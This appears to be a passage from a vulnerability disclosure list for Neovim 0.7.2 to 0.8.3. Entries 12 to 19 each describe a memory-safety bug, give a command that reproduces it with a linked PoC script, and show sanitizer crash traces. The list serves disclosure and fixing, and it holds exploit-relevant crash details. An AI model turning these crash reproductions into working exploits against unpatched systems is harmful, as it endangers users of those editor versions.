    #238 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #239 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #240 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #241 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #242 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #243 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #244 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #245 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #246 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #247 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #248 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7

SUMMARY: AddressSanitizer: stack-overflow /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2603 in eval5
==3184583==ABORTING
```

# 12. Neovim <=0.8.3 Use-After-Free in `src/nvim/spell.c`

## Description
Neovim versions up to and including 0.8.3 are affected by a vulnerability where a use-after-free error occurs in the `did_set_spelllang` function within the `src/nvim/spell.c` file. This issue is triggered when processing specially crafted input, such as a file or command, that causes a previously freed memory region to be accessed. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C224292](./C224292).
```sh
$ ./nvims/neovim-0.8.3/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C224292 -c :qa! 
=================================================================
==3184669==ERROR: AddressSanitizer: heap-use-after-free on address 0x626000003110 at pc 0x00000198ec44 bp 0x7ffc6f390e10 sp 0x7ffc6f390e08
READ of size 8 at 0x626000003110 thread T0
    #0 0x198ec43 in did_set_spelllang /root/vuln/nvims/neovim-0.8.3/src/nvim/spell.c:2098:17
    #1 0xd15304 in do_ecmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_cmds.c:2770:11
    #2 0x7b4991 in do_argfile /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:595:9
    #3 0x7b2930 in ex_next /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:627:5
    #4 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #5 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #6 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #7 0x17def16 in do_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:2036:5
    #8 0x17da36c in cmd_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1618:14
    #9 0x17d9ec3 in ex_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1626:3
    #10 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #11 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #12 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #13 0xd54df0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:287:10
    #14 0x110d40e in exe_commands /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:1807:5
    #15 0x10f739c in main /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:534:5
    #16 0x7f62f7cc6d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #17 0x7f62f7cc6e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #18 0x472fe4 in _start (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x472fe4)

0x626000003110 is located 16 bytes inside of 10488-byte region [0x626000003100,0x6260000059f8)
freed by thread T0 here:
    #0 0x4edc42 in free (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x4edc42)
    #1 0x12edfa4 in xfree /root/vuln/nvims/neovim-0.8.3/src/nvim/memory.c:130:3
    #2 0x7dc1e7 in apply_autocmds_group /root/vuln/nvims/neovim-0.8.3/src/nvim/autocmd.c:1922:7
    #3 0x7e1c20 in apply_autocmds /root/vuln/nvims/neovim-0.8.3/src/nvim/autocmd.c:1532:10
    #4 0x19911c4 in spell_load_lang /root/vuln/nvims/neovim-0.8.3/src/nvim/spell.c:1534:14
    #5 0x198cfc4 in did_set_spelllang /root/vuln/nvims/neovim-0.8.3/src/nvim/spell.c:1964:9
    #6 0xd15304 in do_ecmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_cmds.c:2770:11
    #7 0x7b4991 in do_argfile /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:595:9
    #8 0x7b2930 in ex_next /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:627:5
    #9 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #10 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #11 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #12 0x17def16 in do_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:2036:5
    #13 0x17da36c in cmd_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1618:14
    #14 0x17d9ec3 in ex_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1626:3
    #15 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #16 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #17 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #18 0xd54df0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:287:10
    #19 0x110d40e in exe_commands /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:1807:5
    #20 0x10f739c in main /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:534:5
    #21 0x7f62f7cc6d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

previously allocated by thread T0 here:
    #0 0x4ee022 in calloc (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x4ee022)
    #1 0x12ee046 in xcalloc /root/vuln/nvims/neovim-0.8.3/src/nvim/memory.c:144:15
    #2 0x1e2b382 in win_alloc /root/vuln/nvims/neovim-0.8.3/src/nvim/window.c:4946:19
    #3 0x1e484eb in win_split_ins /root/vuln/nvims/neovim-0.8.3/src/nvim/window.c:1259:12
    #4 0x1e1ad1a in win_split /root/vuln/nvims/neovim-0.8.3/src/nvim/window.c:1017:10
    #5 0x7b37c5 in do_argfile /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:565:11
    #6 0x7b2930 in ex_next /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:627:5
    #7 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #8 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #9 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #10 0x17def16 in do_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:2036:5
    #11 0x17da36c in cmd_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1618:14
    #12 0x17d9ec3 in ex_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1626:3
    #13 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #14 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #15 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #16 0xd54df0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:287:10
    #17 0x110d40e in exe_commands /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:1807:5
    #18 0x10f739c in main /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:534:5
    #19 0x7f62f7cc6d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-use-after-free /root/vuln/nvims/neovim-0.8.3/src/nvim/spell.c:2098:17 in did_set_spelllang
Shadow bytes around the buggy address:
  0x0c4c7fff85d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4c7fff85e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4c7fff85f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4c7fff8600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4c7fff8610: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c4c7fff8620: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4c7fff8630: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4c7fff8640: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4c7fff8650: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4c7fff8660: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4c7fff8670: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3184669==ABORTING
```

# 13. Neovim <=0.8.3 Null Pointer Dereference in `src/nvim/normal.c`

## Description
Neovim versions up to and including 0.8.3 are affected by a vulnerability where an undefined behavior error occurs in the `normal.c` file at line 1747. This issue is triggered when processing specially crafted input, such as a file or command, that causes an attempt to apply a zero offset to a null pointer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C222980](./C222980).
```sh
$ ./nvims/neovim-0.8.3/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C222980 -c :qa! 
/root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:1747:12: runtime error: applying zero offset to null pointer
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:1747:12 in 
```

# 14. Neovim <=0.8.3 Null Pointer Dereference in `src/nvim/spellfile.c`

## Description
Neovim versions up to and including 0.8.3 are affected by a vulnerability where an undefined behavior error occurs in the `spellfile.c` file at line 5003. This issue is triggered when processing specially crafted input, such as a file or command, that causes an attempt to apply a zero offset to a null pointer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C222923](./C222923).
```sh
$ ./nvims/neovim-0.8.3/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C222923 -c :qa! 
/root/vuln/nvims/neovim-0.8.3/src/nvim/spellfile.c:5003:23: runtime error: applying zero offset to null pointer
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /root/vuln/nvims/neovim-0.8.3/src/nvim/spellfile.c:5003:23 in 
```

# 15. Neovim <=0.8.3 Heap Buffer Overflow in `src/nvim/arglist.c`

## Description
Neovim versions up to and including 0.8.3 are affected by a vulnerability where a heap buffer overflow occurs in the `arglist.c` file at line 750. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to read beyond the allocated buffer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C214166](./C214166).
```sh
$ ./nvims/neovim-0.8.3/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C214166 -c :qa! 
=================================================================
==3184964==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6070000040c8 at pc 0x0000007ae987 bp 0x7ffec14c0ee0 sp 0x7ffec14c0ed8
READ of size 4 at 0x6070000040c8 thread T0
    #0 0x7ae986 in alist_name /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:750:28
    #1 0x7bf545 in do_arg_all /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:971:24
    #2 0x7bb733 in ex_all /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:1024:3
    #3 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #4 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #5 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #6 0x17def16 in do_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:2036:5
    #7 0x17da36c in cmd_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1618:14
    #8 0x17d9ec3 in ex_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1626:3
    #9 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #10 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #11 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #12 0xd54df0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:287:10
    #13 0x110d40e in exe_commands /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:1807:5
    #14 0x10f739c in main /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:534:5
    #15 0x7fd77312ed8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #16 0x7fd77312ee3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #17 0x472fe4 in _start (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x472fe4)

0x6070000040c8 is located 8 bytes to the right of 80-byte region [0x607000004070,0x6070000040c0)
allocated by thread T0 here:
    #0 0x4ee1c9 in realloc (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x4ee1c9)
    #1 0x12ee1f2 in xrealloc /root/vuln/nvims/neovim-0.8.3/src/nvim/memory.c:166:15
    #2 0xf0f971 in ga_grow /root/vuln/nvims/neovim-0.8.3/src/nvim/garray.c:106:14
    #3 0x7abd17 in alist_set /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:119:3
    #4 0x7ada43 in do_arglist /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:403:7
    #5 0x7b26f6 in ex_next /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:620:11
    #6 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #7 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #8 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #9 0x7db6ba in apply_autocmds_group /root/vuln/nvims/neovim-0.8.3/src/nvim/autocmd.c:1866:5
    #10 0x7e1c20 in apply_autocmds /root/vuln/nvims/neovim-0.8.3/src/nvim/autocmd.c:1532:10
    #11 0x1e5a467 in win_enter_ext /root/vuln/nvims/neovim-0.8.3/src/nvim/window.c:4791:5
    #12 0x1e4ea55 in win_split_ins /root/vuln/nvims/neovim-0.8.3/src/nvim/window.c:1507:3
    #13 0x1e1ad1a in win_split /root/vuln/nvims/neovim-0.8.3/src/nvim/window.c:1017:10
    #14 0x7bf088 in do_arg_all /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:956:21
    #15 0x7bb733 in ex_all /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:1024:3
    #16 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #17 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #18 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #19 0x17def16 in do_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:2036:5
    #20 0x17da36c in cmd_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1618:14
    #21 0x17d9ec3 in ex_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1626:3
    #22 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #23 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #24 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #25 0xd54df0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:287:10
    #26 0x110d40e in exe_commands /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:1807:5
    #27 0x10f739c in main /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:534:5
    #28 0x7fd77312ed8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/vuln/nvims/neovim-0.8.3/src/nvim/arglist.c:750:28 in alist_name
Shadow bytes around the buggy address:
  0x0c0e7fff87c0: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c0e7fff87d0: 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 fa
  0x0c0e7fff87e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa
  0x0c0e7fff87f0: fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa
  0x0c0e7fff8800: fd fd fd fd fd fd fd fd fd fd fa fa fa fa 00 00
=>0x0c0e7fff8810: 00 00 00 00 00 00 00 00 fa[fa]fa fa fa fa fa fa
  0x0c0e7fff8820: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8830: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8840: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8850: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8860: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3184964==ABORTING
```

# 16. Neovim <=0.8.2 Integer Overflow in `src/nvim/eval.c` 

## Description
Neovim versions up to and including 0.8.2 are affected by a vulnerability where an integer overflow occurs in the `eval.c` file at line 334. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to perform a division operation with values that result in an overflow. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C224293](./C224293).
```sh
$ ./nvims/neovim-0.8.2/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C224293 -c :qa!
Floating point exception (core dumped)

# after compiling with ASAN
$ ./nvims/neovim-0.8.2/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C224293 -c :qa! 
/root/vuln/nvims/neovim-0.8.2/src/nvim/eval.c:334:17: runtime error: division of -9223372036854775808 by -1 cannot be represented in type 'long'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /root/vuln/nvims/neovim-0.8.2/src/nvim/eval.c:334:17 in 
```

# 17. Neovim <=0.7.2 Negative Size Parameter in `src/nvim/regexp.c`

## Description
Neovim versions up to and including 0.7.2 are affected by a vulnerability where a negative size parameter is passed to the `memmove` function, leading to undefined behavior. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to call `memmove` with a negative size. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition or potentially execute arbitrary code.

## PoC
poc at [C232610](./C232610).
```sh
$ ./nvims/neovim-0.7.2/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C232610 -c :qa! 
=================================================================
==3188697==ERROR: AddressSanitizer: negative-size-param: (size=-2145058819)
    #0 0x4e875c in __asan_memmove (/root/vuln/nvims/neovim-0.7.2/build/bin/nvim+0x4e875c)
    #1 0x158d5f5 in regtilde /root/vuln/nvims/neovim-0.7.2/src/nvim/regexp.c:1550:9
    #2 0xc7f705 in do_sub /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds.c:3669:11
    #3 0xc79802 in ex_substitute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds.c:6053:11
    #4 0xce84a6 in do_one_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:1972:5
    #5 0xcd2a95 in do_cmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:595:20
    #6 0x13193e9 in nv_colon /root/vuln/nvims/neovim-0.7.2/src/nvim/normal.c:4082:20
    #7 0x1304511 in normal_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/normal.c:1166:3
    #8 0x12fc8d2 in normal_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/normal.c:7637:9
    #9 0xd327e0 in exec_normal /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:8748:5
    #10 0xd324ee in exec_normal_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:8731:3
    #11 0xd5d8ff in ex_normal /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:8663:7
    #12 0xce84a6 in do_one_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:1972:5
    #13 0xcd2a95 in do_cmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:595:20
    #14 0xcbc8c0 in do_source /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds2.c:2086:5
    #15 0xcb8b2c in cmd_source /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds2.c:1678:14
    #16 0xcb8c13 in ex_source /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds2.c:1659:3
    #17 0xce84a6 in do_one_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:1972:5
    #18 0xcd2a95 in do_cmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:595:20
    #19 0xcd8300 in do_cmdline_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:279:10
    #20 0x1066b0e in exe_commands /root/vuln/nvims/neovim-0.7.2/src/nvim/main.c:1848:5
    #21 0x1050ddd in main /root/vuln/nvims/neovim-0.7.2/src/nvim/main.c:522:5
    #22 0x7f6e01c37d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #23 0x7f6e01c37e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #24 0x46e0f4 in _start (/root/vuln/nvims/neovim-0.7.2/build/bin/nvim+0x46e0f4)

0x7f6d55841800 is located 0 bytes inside of 2149908494-byte region [0x7f6d55841800,0x7f6dd5a9180e)
allocated by thread T0 here:
    #0 0x4e8fbd in malloc (/root/vuln/nvims/neovim-0.7.2/build/bin/nvim+0x4e8fbd)
    #1 0x11ffdf2 in try_malloc /root/vuln/nvims/neovim-0.7.2/src/nvim/memory.c:74:15
    #2 0x11fffdc in xmalloc /root/vuln/nvims/neovim-0.7.2/src/nvim/memory.c:108:15
    #3 0x158d56f in regtilde /root/vuln/nvims/neovim-0.7.2/src/nvim/regexp.c:1547:18
    #4 0xc7f705 in do_sub /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds.c:3669:11
    #5 0xc79802 in ex_substitute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds.c:6053:11
    #6 0xce84a6 in do_one_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:1972:5
    #7 0xcd2a95 in do_cmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:595:20
    #8 0x13193e9 in nv_colon /root/vuln/nvims/neovim-0.7.2/src/nvim/normal.c:4082:20
    #9 0x1304511 in normal_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/normal.c:1166:3
    #10 0x12fc8d2 in normal_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/normal.c:7637:9
    #11 0xd327e0 in exec_normal /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:8748:5
    #12 0xd324ee in exec_normal_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:8731:3
    #13 0xd5d8ff in ex_normal /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:8663:7
    #14 0xce84a6 in do_one_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:1972:5
    #15 0xcd2a95 in do_cmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:595:20
    #16 0xcbc8c0 in do_source /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds2.c:2086:5
    #17 0xcb8b2c in cmd_source /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds2.c:1678:14
    #18 0xcb8c13 in ex_source /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_cmds2.c:1659:3
    #19 0xce84a6 in do_one_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:1972:5
    #20 0xcd2a95 in do_cmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:595:20
    #21 0xcd8300 in do_cmdline_cmd /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_docmd.c:279:10
    #22 0x1066b0e in exe_commands /root/vuln/nvims/neovim-0.7.2/src/nvim/main.c:1848:5
    #23 0x1050ddd in main /root/vuln/nvims/neovim-0.7.2/src/nvim/main.c:522:5
    #24 0x7f6e01c37d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: negative-size-param (/root/vuln/nvims/neovim-0.7.2/build/bin/nvim+0x4e875c) in __asan_memmove
==3188697==ABORTING
```

# 18. Neovim <=0.7.2 Null Pointer Dereference in `src/nvim/regexp.c`

## Description
Neovim versions up to and including 0.7.2 are affected by a vulnerability where a null pointer dereference occurs in the `regexp.c` file at line 2388. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to access a member of a `regprog_T` structure through a null pointer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C221674](./C221674) and [C221620](./C221620).
```sh
$ ./nvims/neovim-0.7.2/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C221674 -c :qa! 
/root/vuln/nvims/neovim-0.7.2/src/nvim/regexp.c:2388:21: runtime error: member access within null pointer of type 'regprog_T' (aka 'struct regprog')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /root/vuln/nvims/neovim-0.7.2/src/nvim/regexp.c:2388:21 in 
```

# 19. Neovim <=0.7.2 Stack Overflow in `src/nvim/ex_getln.c`

## Description
Neovim versions up to and including 0.7.2 are affected by a vulnerability where a stack overflow occurs in the `ex_getln.c` file at line 1890. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to recursively call the `command_line_handle_key` function, leading to excessive stack usage. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C221771](./C221771).
```sh
$ ./nvims/neovim-0.7.2/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C221771 -c :qa! 
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3188954==ERROR: AddressSanitizer: stack-overflow on address 0x7ffeb7520c68 (pc 0x000000debf58 bp 0x7ffeb7521d10 sp 0x7ffeb7520c70 T0)
    #0 0xdebf58 in command_line_handle_key /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1890:5
    #1 0xddb53f in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1572:10
    #2 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #3 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
